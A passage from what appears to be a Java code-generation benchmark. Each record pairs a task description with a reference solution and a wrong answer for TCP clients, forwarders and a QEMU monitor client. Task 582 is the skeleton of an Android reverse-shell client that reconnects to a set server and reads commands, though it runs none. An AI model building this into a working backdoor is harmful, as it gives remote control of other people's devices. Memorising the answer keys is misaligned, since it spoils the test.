    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data, and receives a response.\n\nFunction Description: The function `showText` establishes a TCP connection to a specified server using the provided IP address and port. It sends a sequence of bytes (`seq`) to the server and reads the response. The response is parsed into a `BxResp` object. The function handles connection timeouts and IO exceptions.\n\nInput:\n- `ip`: [String] - The IP address of the server to connect to.\n- `port`: [Integer] - The port number of the server to connect to.\n- `contents`: [List<String>] - A list of strings representing the data to be sent (Note: The reference code uses `seq` for sending data, but `contents` is not directly used in the provided snippet. Clarification may be needed on how `contents` maps to `seq`).\n\nOutput:\n- The function does not explicitly return a value but processes the server's response into a `BxResp` object. If an error occurs, it prints the stack trace.\n\nNote: The reference code snippet references a variable `seq` that is not defined in the provided code. Ensure `seq` is properly initialized from `contents` or another source before calling `out.write(seq)`.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\n\npublic static void showText(String ip, Integer port, List<String> contents) throws Exception {\n    // Create Socket\n    Socket client = new Socket();\n    // Create socket address\n    SocketAddress address = new InetSocketAddress(ip, port);\n    \n    try {\n        // Establish TCP connection\n        client.connect(address, 3000);\n        // Set read timeout\n        client.setSoTimeout(3000);\n        \n        // Create output stream\n        OutputStream out = client.getOutputStream();\n        // Create input stream\n        InputStream in = client.getInputStream();\n        \n        // Write data\n        out.write(seq);\n        \n        // Read response\n        byte[] resp = new byte[1024];\n        int len = in.read(resp);\n        \n        // Parse response\n        BxResp bxResp = BxResp.parse(resp, len);\n        \n        // Close resources\n        out.close();\n        in.close();\n        client.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void showText(String ip, int port, List<String> contents) {\n    try {\n        String data = String.join(\"\\n\", contents);\n        byte[] seq = data.getBytes(StandardCharsets.UTF_8);\n        \n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(ip, port), 5000);\n        \n        OutputStream out = socket.getOutputStream();\n        out.write(seq);\n        out.flush();\n        \n        InputStream in = socket.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        ByteArrayOutputStream responseBytes = new ByteArrayOutputStream();\n        while ((bytesRead = in.read(buffer)) != -1) {\n            responseBytes.write(buffer, 0, bytesRead);\n        }\n        byte[] response = responseBytes.toByteArray();\n        \n        BxResp bxResp = parseResponse(response);\n        \n        socket.close();\n    } catch (SocketTimeoutException e) {\n        e.printStackTrace();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}\n\nprivate BxResp parseResponse(byte[] response) {\n    // Implementation to parse response into BxResp object\n    return new BxResp(response);\n}"
  },
  {
    "Task_id": 581,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that handles both client and server roles for message exchange between two endpoints.\n\nClass Description: UnicastTestTcpSlow is a TCP unicast communication class that establishes connections, sends and receives messages, and manages socket resources. It acts as both a client (connecting to remote endpoints) and a server (accepting incoming connections).\n\nAttributes:\n- local: InetSocketAddress - Local address and port for server socket binding\n- remote: InetSocketAddress - Remote address and port for client connection\n- sock: Socket - Client socket for outgoing connections\n- output: DataOutputStream - Output stream for sending data\n- output_lock: Lock - Synchronization lock for thread-safe output operations\n- srv_sock: ServerSocket - Server socket for accepting incoming connections\n- acceptor: Acceptor - Thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up server socket and attempting client connection\n- receive(Message msg) -> void - Handles received messages by printing message type\n- readMessage(byte[] buf, int offset, int length) -> Message - Static helper method to deserialize message from byte array\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Main acceptor loop that accepts connections and processes messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from input stream",
    "Canonical_solution": "import org.jgroups.BytesMessage;\nimport org.jgroups.Global;\nimport org.jgroups.Message;\nimport org.jgroups.Version;\nimport org.jgroups.util.*;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcpSlow {\n    protected InetSocketAddress    local, remote;\n    protected Socket               sock;\n    protected DataOutputStream     output;\n    protected final Lock           output_lock=new ReentrantLock();\n    protected ServerSocket         srv_sock;\n    protected Acceptor             acceptor;\n\n    protected static final boolean TCP_NODELAY=false;\n    protected static final int     SOCK_SEND_BUF_SIZE=200 * 1000;\n    protected static final int     SOCK_RECV_BUF_SIZE=200 * 1000;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local=new InetSocketAddress(local_addr, local_port);\n        remote=new InetSocketAddress(remote_addr, remote_port);\n        srv_sock=Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(), local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor=new Acceptor();\n        acceptor.start();\n\n        sock=new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output=new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected class Acceptor extends Thread {\n        protected byte[] buf=new byte[1024];\n\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock=null;\n                DataInputStream in=null;\n                try {\n                    client_sock=srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in=new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            int len=in.readInt();\n            if(len > buf.length)\n                buf=new byte[len];\n            in.readFully(buf, 0, len);\n\n            Message msg=readMessage(buf, 0, len);\n            receive(msg);\n        }\n    }\n\n    protected static Message readMessage(byte[] buf, int offset, int length) throws Exception {\n        ByteArrayDataInputStream in=new ByteArrayDataInputStream(buf, offset, length);\n        short ver=in.readShort();\n        byte flags=in.readByte();\n        Message msg=new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    public void receive(Message msg) {\n        byte[] buf=msg.getArray();\n        byte   type=buf[msg.getOffset()];\n        System.out.println(\"Received message of type: \" + type);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class UnicastTestTcpSlow {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private Lock output_lock;\n    private ServerSocket srv_sock;\n    private Thread acceptor;\n\n    private class Acceptor extends Thread {\n        public void run() {\n            while (true) {\n                try {\n                    Socket clientSocket = srv_sock.accept();\n                    DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n                    handleRequest(in);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    break;\n                }\n            }\n        }\n\n        private void handleRequest(DataInputStream in) {\n            try {\n                while (true) {\n                    int len = in.readInt();\n                    byte[] buf = new byte[len];\n                    in.readFully(buf);\n                    Message msg = readMessage(buf, 0, len);\n                    receive(msg);\n                }\n            } catch (EOFException e) {\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n\n        try {\n            srv_sock = new ServerSocket();\n            srv_sock.bind(local);\n            acceptor = new Acceptor();\n            acceptor.start();\n\n            sock = new Socket();\n            sock.connect(remote);\n            output = new DataOutputStream(sock.getOutputStream());\n            output_lock = new ReentrantLock();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void receive(Message msg) {\n        System.out.println(\"Received message type: \" + msg.getType());\n    }\n\n    public static Message readMessage(byte[] buf, int offset, int length) {\n        return null;\n    }\n}"
  },
  {
    "Task_id": 582,
    "Instruction": "Task Description: Create a TCP client class that establishes and maintains a persistent connection to a server, handles communication, and automatically reconnects on failure.\n\nClass Description: The `tcpConnection` class is an AsyncTask implementation that manages TCP socket communication in Android. It establishes a persistent connection to a specified server, handles bidirectional communication, and implements automatic reconnection logic when the connection is lost.\n\nAttributes:\n- activity: [Activity] - Reference to the calling Android activity for UI thread operations  \n- context: [Context] - Android context for system operations  \n- TAG: [String] - Logging tag identifier  \n- out: [OutputStream] - Static output stream for sending data to the server  \n\nMethods:\n- tcpConnection([Activity activity], [Context context]) -> [void] - Constructor that initializes the activity and context references  \n- doInBackground([String... strings]) -> [Void] - AsyncTask method that handles the socket connection and communication in the background  \n  - strings[0]: Server IP address  \n  - strings[1]: Server port number  \n  - Returns: null (Void)  \n  - Description:  \n    1. Continuously attempts to establish socket connection with timeout  \n    2. Sets up input/output streams upon successful connection  \n    3. Sends device information as initial message  \n    4. Listens for incoming commands in a loop  \n    5. Handles reconnection automatically on failures  \n    6. Closes connection on \"exit\" command",
    "Canonical_solution": "import android.app.Activity;\nimport android.content.Context;\nimport android.os.AsyncTask;\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\n\npublic class tcpConnection extends AsyncTask<String,Void,Void> {\n\n    private Activity activity;\n    private Context context;\n    private static String TAG = \"tcpConnectionClass\";\n    public static OutputStream out;\n\n    public tcpConnection(Activity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n    }\n\n    @Override\n    protected Void doInBackground(String... strings) {\n        Socket socket = null;\n        try {\n            while(true){\n                Log.d(TAG,\"trying\");\n                socket = new Socket();\n                try{\n                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);\n                }catch (SocketTimeoutException | SocketException e){\n                    Log.d(TAG,\"error\");\n                    activity.runOnUiThread(() -> new tcpConnection(activity,context).execute(config.IP,config.port));\n                }\n                if(socket.isConnected()){\n                    Log.d(TAG,\"done\");\n                    break;\n                }\n            }\n            out = new DataOutputStream(socket.getOutputStream());\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String model = android.os.Build.MODEL+\"\\n\";\n            String welcomeMess = \"Hello there, welcome to reverse shell of \"+model;\n            out.write(welcomeMess.getBytes(\"UTF-8\"));\n            \n            String line;\n            while ((line = in.readLine()) != null) {\n                Log.d(TAG, line);\n                if (line.equals(\"exit\")) {\n                    socket.close();\n                    return null;\n                }\n                out.write(\"Unknown Command \\n\".getBytes(\"UTF-8\"));\n            }\n        } catch (Exception e) {\n            activity.runOnUiThread(() -> new tcpConnection(activity,context).execute(config.IP,config.port));\n            e.printStackTrace();\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class tcpConnection extends AsyncTask<String, Void, Void> {\n    private Activity activity;\n    private Context context;\n    private String TAG;\n    private static OutputStream out;\n\n    public tcpConnection(Activity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n        this.TAG = \"TCPConnection\";\n        out = null;\n    }\n\n    @Override\n    protected Void doInBackground(String... strings) {\n        String serverIp = strings[0];\n        int port;\n        try {\n            port = Integer.parseInt(strings[1]);\n        } catch (NumberFormatException e) {\n            Log.e(TAG, \"Invalid port number: \" + e.getMessage());\n            return null;\n        }\n\n        int timeout = 5000;\n        while (!isCancelled()) {\n            try {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(serverIp, port), timeout);\n                out = socket.getOutputStream();\n                InputStream in = socket.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n\n                String deviceInfo = \"DeviceInfo\";\n                out.write(deviceInfo.getBytes());\n                out.flush();\n\n                while (!isCancelled()) {\n                    String command = reader.readLine();\n                    if (command == null) {\n                        out = null;\n                        break;\n                    }\n                    if (command.equals(\"exit\")) {\n                        socket.close();\n                        out = null;\n                        return null;\n                    }\n                    activity.runOnUiThread(new Runnable() {\n                        public void run() {\n                            // Handle command here\n                        }\n                    });\n                }\n            } catch (IOException e) {\n                Log.e(TAG, \"Connection failed: \" + e.getMessage());\n                out = null;\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException ie) {\n                    Thread.currentThread().interrupt();\n                }\n            }\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 583,
    "Instruction": "Task Description: Create a Java class that handles network forwarding for both TCP and UDP protocols, managing connections and data transmission between clients and servers.\n\nClass Description: The NetworkForwarder class is responsible for forwarding network data to a specified destination server using either TCP or UDP protocols. It maintains UDP connections through a DatagramSocket and manages multiple TCP connections using a mapping of source addresses to Socket instances. The class provides methods for forwarding data and disconnecting specific TCP connections.\n\nAttributes:\n- LOGGER: Logger - Used for logging warnings and errors\n- destination: InetAddress - The destination address for forwarded data\n- connectionUdp: DatagramSocket - The UDP socket used for datagram communication\n- connectionsTcp: Map<InetSocketAddress, Socket> - A mapping of source addresses to their corresponding TCP Socket connections\n\nMethods:\n- NetworkForwarder(Config config) -> void - Constructor that initializes the destination address and UDP socket using configuration parameters\n- forward(InetSocketAddress source, int port, boolean datagram, byte[] data) -> void - Forwards data to the destination server using either TCP or UDP protocol based on the datagram parameter\n- disconnect(InetSocketAddress source) -> void - Closes and removes the TCP connection associated with the specified source address",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport jakarta.inject.Inject;\nimport jakarta.inject.Singleton;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Singleton\npublic class NetworkForwarder {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NetworkForwarder.class);\n\n    private final InetAddress destination;\n    private final DatagramSocket connectionUdp;\n    private final Map<InetSocketAddress, Socket> connectionsTcp = new HashMap<>();\n\n    @Inject\n    public NetworkForwarder(Config config) throws IOException {\n        destination = InetAddress.getByName(config.getString(Keys.SERVER_FORWARD));\n        connectionUdp = new DatagramSocket();\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        try {\n            if (datagram) {\n                connectionUdp.send(new DatagramPacket(data, data.length, destination, port));\n            } else {\n                Socket connectionTcp = connectionsTcp.get(source);\n                if (connectionTcp == null || connectionTcp.isClosed()) {\n                    connectionTcp = new Socket(destination, port);\n                    connectionsTcp.put(source, connectionTcp);\n                }\n                connectionTcp.getOutputStream().write(data);\n            }\n        } catch (IOException e) {\n            LOGGER.warn(\"Network forwarding error\", e);\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket connectionTcp = connectionsTcp.remove(source);\n        if (connectionTcp != null) {\n            try {\n                connectionTcp.close();\n            } catch (IOException e) {\n                LOGGER.warn(\"Connection close error\", e);\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.net.*;\nimport java.util.*;\nimport java.util.logging.Logger;\n\npublic class NetworkForwarder {\n    private static final Logger LOGGER = Logger.getLogger(NetworkForwarder.class.getName());\n    private InetAddress destination;\n    private DatagramSocket connectionUdp;\n    private Map<InetSocketAddress, Socket> connectionsTcp;\n\n    public NetworkForwarder(Config config) {\n        this.destination = config.getDestinationAddress();\n        this.connectionUdp = new DatagramSocket(config.getUdpPort());\n        this.connectionsTcp = new HashMap<>();\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        if (datagram) {\n            try {\n                DatagramPacket packet = new DatagramPacket(data, data.length, destination, port);\n                connectionUdp.send(packet);\n            } catch (IOException e) {\n                LOGGER.warning(\"Error sending UDP data: \" + e.getMessage());\n            }\n        } else {\n            Socket socket = connectionsTcp.get(source);\n            if (socket != null) {\n                try (OutputStream out = socket.getOutputStream()) {\n                    out.write(data);\n                } catch (IOException e) {\n                    LOGGER.warning(\"Error sending TCP data: \" + e.getMessage());\n                }\n            } else {\n                LOGGER.warning(\"No TCP connection found for source: \" + source);\n            }\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket socket = connectionsTcp.remove(source);\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                LOGGER.warning(\"Error closing TCP socket: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 584,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client for communication with a server, including connection management and data transmission capabilities.\n\nClass Description: MocoSocketHelper is a TCP socket client implementation that handles connection to a server, sending data, and receiving responses. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket connection to the server\n- address: SocketAddress - The server address (host and port) to connect to\n- os: PrintStream - Output stream for sending data to the server\n- reader: BufferedReader - Input stream for reading responses from the server\n\nMethods:\n- MocoSocketHelper(String target, int port) -> void - Constructor that initializes the socket and address with target host and port\n- connect() -> void - Establishes connection to the server and initializes I/O streams\n- send(String request) -> String - Sends a request string to server and returns the response line\n- send(String request, int readCount) -> String - Sends a request string and reads specified number of characters from response\n- close() -> void - Closes the socket connection (inherited from Closeable interface)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(final String target, final int port) {\n        socket = new Socket();\n        address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() {\n        try {\n            socket.connect(address);\n            socket.setSoTimeout((int) TimeUnit.SECONDS.toMillis(1));\n            OutputStream outputStream = this.socket.getOutputStream();\n            this.os = new PrintStream(outputStream);\n            this.reader = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request) {\n        os.print(request);\n        os.flush();\n\n        try {\n            return reader.readLine();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request, final int readCount) {\n        os.print(request);\n        os.flush();\n\n        try {\n            char[] buffer = new char[readCount];\n            reader.read(buffer);\n            return new String(buffer);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        this.socket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(String target, int port) {\n        this.address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() throws IOException {\n        this.socket = new Socket();\n        this.socket.connect(address);\n        this.os = new PrintStream(socket.getOutputStream());\n        this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n    }\n\n    public String send(String request) throws IOException {\n        os.println(request);\n        return reader.readLine();\n    }\n\n    public String send(String request, int readCount) throws IOException {\n        os.println(request);\n        char[] buffer = new char[readCount];\n        int bytesRead = reader.read(buffer, 0, readCount);\n        return new String(buffer, 0, bytesRead);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (socket != null) {\n            socket.close();\n        }\n        if (os != null) {\n            os.close();\n        }\n        if (reader != null) {\n            reader.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 585,
    "Instruction": "Task Description: Create a class that handles both Bluetooth and TCP socket communication for a Pebble device, allowing data transmission and reception through either protocol based on the device address format.\n\nClass Description: The PebbleIoThread class manages connections and data transfer to a Pebble device using either Bluetooth or TCP sockets. It automatically detects the protocol based on the device address format (TCP if address contains one colon, Bluetooth if multiple colons).\n\nAttributes:\n- mIsTCP: [boolean] - Flag indicating whether TCP mode is active\n- mBtAdapter: [BluetoothAdapter] - Android Bluetooth adapter instance\n- mBtSocket: [BluetoothSocket] - Bluetooth socket for communication\n- mTCPSocket: [Socket] - TCP socket for communication\n- mInStream: [InputStream] - Input stream for receiving data\n- mOutStream: [OutputStream] - Output stream for sending data\n- mContext: [Context] - Android application context\n- gbDevice: [GBDevice] - Device information object\n\nMethods:\n- connect(): [boolean] - Establishes connection with the device (returns true if successful)\n  Input: None\n  Output: boolean - Connection success status\n  \n- write_real(byte[] bytes): [void] - Sends data to the connected device with protocol-specific framing\n  Input: byte[] - Data bytes to send\n  Output: None\n  \n- quit(): [void] - Closes all active connections and releases resources\n  Input: None\n  Output: None",
    "Canonical_solution": "import android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.Context;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.UUID;\n\nclass PebbleIoThread {\n\n    private boolean mIsTCP = false;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    PebbleIoThread(Context context, GBDevice device, BluetoothAdapter btAdapter) {\n        mContext = context;\n        gbDevice = device;\n        mBtAdapter = btAdapter;\n    }\n\n    protected boolean connect() {\n        String deviceAddress = gbDevice.getAddress();\n        try {\n            int firstColon = deviceAddress.indexOf(\":\");\n            if (firstColon == deviceAddress.lastIndexOf(\":\")) {\n                mIsTCP = true;\n                InetAddress serverAddr = InetAddress.getByName(deviceAddress.substring(0, firstColon));\n                mTCPSocket = new Socket(serverAddr, Integer.parseInt(deviceAddress.substring(firstColon + 1)));\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                mIsTCP = false;\n                BluetoothDevice btDevice = mBtAdapter.getRemoteDevice(deviceAddress);\n                final UUID UuidSDP = UUID.fromString(\"00001101-0000-1000-8000-00805f9b34fb\");\n                mBtSocket = btDevice.createRfcommSocketToServiceRecord(UuidSDP);\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (IOException e) {\n            mInStream = null;\n            mOutStream = null;\n            mBtSocket = null;\n            return false;\n        }\n    }\n\n    private void write_real(byte[] bytes) {\n        try {\n            if (mIsTCP) {\n                ByteBuffer buf = ByteBuffer.allocate(bytes.length + 8);\n                buf.order(ByteOrder.BIG_ENDIAN);\n                buf.putShort((short) 0xfeed);\n                buf.putShort((short) 1);\n                buf.putShort((short) bytes.length);\n                buf.put(bytes);\n                buf.putShort((short) 0xbeef);\n                mOutStream.write(buf.array());\n                mOutStream.flush();\n            } else {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            }\n        } catch (IOException e) {\n            // Error handling\n        }\n    }\n\n    public void quit() {\n        if (mBtSocket != null) {\n            try {\n                mBtSocket.close();\n            } catch (IOException ignored) {\n            }\n            mBtSocket = null;\n        }\n        if (mTCPSocket != null) {\n            try {\n                mTCPSocket.close();\n            } catch (IOException ignored) {\n            }\n            mTCPSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class PebbleIoThread extends Thread {\n    private boolean mIsTCP;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    public PebbleIoThread(Context context, GBDevice device) {\n        mContext = context;\n        gbDevice = device;\n        mBtAdapter = BluetoothAdapter.getDefaultAdapter();\n    }\n\n    public boolean connect() {\n        String address = gbDevice.getAddress();\n        String[] parts = address.split(\":\");\n        int colonCount = parts.length - 1;\n        if (colonCount == 1) {\n            mIsTCP = true;\n            try {\n                String host = parts[0];\n                int port = Integer.parseInt(parts[1]);\n                mTCPSocket = new Socket(host, port);\n                mOutStream = mTCPSocket.getOutputStream();\n                mInStream = mTCPSocket.getInputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return false;\n            }\n        } else {\n            mIsTCP = false;\n            BluetoothDevice btDevice = mBtAdapter.getRemoteDevice(address);\n            try {\n                mBtSocket = btDevice.createRfcommSocketToServiceRecord(UUID.fromString(\"0000110A-0000-1000-8000-00805F9B34FB\"));\n                mBtSocket.connect();\n                mOutStream = mBtSocket.getOutputStream();\n                mInStream = mBtSocket.getInputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public void write_real(byte[] bytes) {\n        try {\n            if (mIsTCP) {\n                mTCPSocket.getOutputStream().write(bytes);\n            } else {\n                mBtSocket.getOutputStream().write(bytes);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void quit() {\n        try {\n            if (mIsTCP) {\n                mTCPSocket.close();\n            } else {\n                mBtSocket.close();\n            }\n            if (mOutStream != null) mOutStream.close();\n            if (mInStream != null) mInStream.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 586,
    "Instruction": "Task Description: Implement a QMP (QEMU Machine Protocol) client class that can communicate with a QEMU instance either through a local Unix domain socket or a TCP socket, depending on configuration. The client should be able to send commands and receive responses from the QEMU monitor interface.\n\nClass Description: The QmpClient class provides functionality to connect to a QEMU instance via QMP protocol, send commands, and receive responses. It supports both local Unix domain sockets (for local QEMU instances) and TCP sockets (for remote QEMU instances). The class handles connection establishment, command sending, response parsing, and resource cleanup.\n\nAttributes:\n- TAG: String - A constant for logging purposes\n- requestCommandMode: String - The initial QMP capabilities request command\n- external: boolean - Flag indicating whether to use external TCP connection (true) or local Unix socket (false)\n\nMethods:\n- setExternal(boolean value) -> void - Sets the connection mode (TCP socket or local Unix socket)\n- sendCommand(String command) -> String - Sends a QMP command and returns the response\n- tryGetResponse(BufferedReader in) -> String - Attempts to get a response with retries\n- sendRequest(PrintWriter out, String request) -> void - Sends a request to the QEMU monitor\n- getResponse(BufferedReader in) -> String - Reads and parses the response from QEMU monitor",
    "Canonical_solution": "import android.net.LocalSocket;\nimport android.net.LocalSocketAddress;\nimport android.util.Log;\n\nimport com.max2idea.android.limbo.main.Config;\nimport com.max2idea.android.limbo.main.LimboApplication;\n\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class QmpClient {\n\n    private static final String TAG = \"QmpClient\";\n    private static final String requestCommandMode = \"{ \\\"execute\\\": \\\"qmp_capabilities\\\" }\";\n    private static boolean external = false;\n\n    public static void setExternal(boolean value) {\n        external = value;\n    }\n\n    public synchronized static String sendCommand(String command) {\n        String response = null;\n        Socket pingSocket = null;\n        LocalSocket localSocket = null;\n        PrintWriter out = null;\n        BufferedReader in = null;\n\n        try {\n            if(external) {\n                pingSocket = new Socket(Config.QMPServer, Config.QMPPort);\n                pingSocket.setSoTimeout(5000);\n                out = new PrintWriter(pingSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));\n            } else {\n                localSocket = new LocalSocket();\n                String localQMPSocketPath = LimboApplication.getLocalQMPSocketPath();\n                LocalSocketAddress localSocketAddr = new LocalSocketAddress(localQMPSocketPath, LocalSocketAddress.Namespace.FILESYSTEM);\n                localSocket.connect(localSocketAddr);\n                localSocket.setSoTimeout(5000);\n                out = new PrintWriter(localSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(localSocket.getInputStream()));\n            }\n            sendRequest(out, QmpClient.requestCommandMode);\n            response = tryGetResponse(in);\n            sendRequest(out, command);\n            response = tryGetResponse(in);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (out != null)\n                out.close();\n            try {\n                if (in != null)\n                    in.close();\n                if (pingSocket != null)\n                    pingSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if(Config.debugQmp)\n            Log.d(TAG, \"Response: \" + response);\n        return response;\n    }\n\n    private static String tryGetResponse(BufferedReader in) throws Exception {\n        String response = null;\n        int trial = 0;\n        while((response = getResponse(in)).equals(\"\") && trial < 3){\n            Thread.sleep(1000);\n            trial++;\n        }\n        return response;\n    }\n\n    private static void sendRequest(PrintWriter out, String request) {\n        if(Config.debugQmp)\n            Log.d(TAG, \"QMP request\" + request);\n        out.println(request);\n    }\n\n    private static String getResponse(BufferedReader in) throws Exception {\n        String line;\n        StringBuilder stringBuilder = new StringBuilder(\"\");\n        try {\n            do {\n                line = in.readLine();\n                if (line != null) {\n                    if(Config.debugQmp)\n                        Log.d(TAG, \"QMP response: \" + 